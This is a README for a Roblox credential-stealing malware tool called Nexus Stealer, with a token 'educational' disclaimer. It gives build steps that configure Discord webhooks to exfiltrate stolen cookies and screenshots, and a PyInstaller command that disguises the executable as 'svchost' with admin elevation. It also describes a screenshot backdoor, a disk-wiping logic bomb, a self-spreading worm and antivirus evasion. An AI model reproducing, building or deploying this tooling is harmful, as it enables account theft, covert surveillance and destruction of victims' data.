# NEXUS STEALER *V1.1.0*

**Disclaimer**: This code is provided for **educational purposes only**. I do not endorse or encourage any misuse, illegal activities, or damage caused by this code. By using this script, you agree that **you are solely responsible** for your actions. I bears no liability for any consequences arising from the use of this tool.

## Version System

The version system is easy to understand, the first number 'V**1**.0.0' is the main number to tell the "Era", for example, major updates will change the first numner. The second number 'V1.**0**.0' is a sub-version of the "Era", for example, the adds of simple updates such as a better security etc... will change the second number. Finally, the third number 'V1.0.**0**' is the patch number. Meaning that if there is a little security bug fix or any tiny fix, the last number will change.

---

## Updates
**Version :** *V1.1.0*

- Better AV Evasion

## Following Update
**Version :** *V1.2.0*

- Virtual Machine Detection

---

## Installation and customization *(≈ 5-10 Minutes)*

- **YOU ABSOLUTELY NEED PYTHON >=3.10 *(Latest version recommended)***

- Change the :
```
COOKIE_WEBHOOK_URLS = ["1", "1_backup"]
SCREENSHOT_WEBHOOK_URLS = ["2", "2_backup"]
```
By 4 **DIFFERENT** discord webhooks

- Install the dependencies :
```
pip install psutil requests pyautogui cryptography netifaces pywin32
```
- Convert to .exe :
```
pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import requests --hidden-import pyautogui --hidden-import cryptography --hidden-import netifaces --hidden-import win32crypt --hidden-import win32gui --hidden-import win32con --hidden-import win32process --hidden-import win32security --hidden-import win32api --hidden-import win32file --uac-admin --name svchost --icon=NONE NexusStealer.py
```

---

## Explanation

When executed on a machine, the script will wait for a **Roblox Related** application to be oppened. He will then search the whole computer data and browser data in search of the roblox login cookie (ROBLOSECURITY). Once found, it will send the cookie to the designed webhook, leave behind him a backdoor that will send a screenshot of the targeted user desktop **every 30 Minutes** and leave another logic bomb that will continuisly check to see if the backdoor has been deleted, if yes, it will wipe the whole user computer from top to bottom. 

***DO NOT RUN THIS SCRIPT ON YOUR OWN MACHINE, A VIRTUAL MACHINE OR ON SOMEONE ELSE MACHINE WITHOUT THEIR CONSENT.***
**Ive implemented a WORM in the script, meaning that it will spread in the network through ip, usb and emails meaning that even on a VM, it can spread through your network. Please be cautious of the uses of this script.**
